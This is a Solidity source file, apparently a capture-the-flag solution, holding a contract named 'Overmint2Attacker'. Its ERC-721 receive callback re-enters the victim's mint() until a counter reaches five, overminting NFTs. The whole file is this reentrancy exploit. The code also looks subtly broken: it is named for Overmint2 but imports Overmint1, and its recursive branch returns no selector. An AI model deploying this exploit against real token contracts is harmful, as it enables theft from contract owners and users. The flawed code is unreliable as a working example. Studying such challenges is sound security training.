// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.11;

import {Overmint1} from "./Overmint1.sol";

contract Overmint2Attacker {
    address public victim;
    uint256 public counter;

    function setVictim(address _victim) external {
        victim = _victim;
    }

    function attack() public {
        Overmint1(victim).mint();
    }

    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
        if (counter < 5) {
            counter++;
            attack();
        } else {
            return Overmint2Attacker.onERC721Received.selector;
        }
    }
}
